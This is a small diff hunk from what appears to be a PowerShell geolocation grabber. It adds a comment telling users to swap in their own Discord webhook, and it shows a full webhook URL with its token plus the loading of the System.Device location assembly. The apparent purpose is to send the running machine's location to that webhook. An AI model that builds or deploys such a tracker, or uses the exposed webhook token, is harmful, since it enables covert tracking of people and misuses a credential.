@@ -36,6 +36,7 @@ Start-Sleep -Seconds 1
 # - Urban areas: higher accuracy
 # - Rural areas: lower accuracy
 
+#Change the webhook inside the quotation marks to your own webhook
 $WebhookUrl = "https://discord.com/api/webhooks/1510389267241631754/bsEM-H8cxl_Cu7o8Kj5-rOCXAxzMdme_WKZI2vKN3vDCTMKQo5pxT5MT34YYXInQQlpT"
 
 Add-Type -AssemblyName System.Device
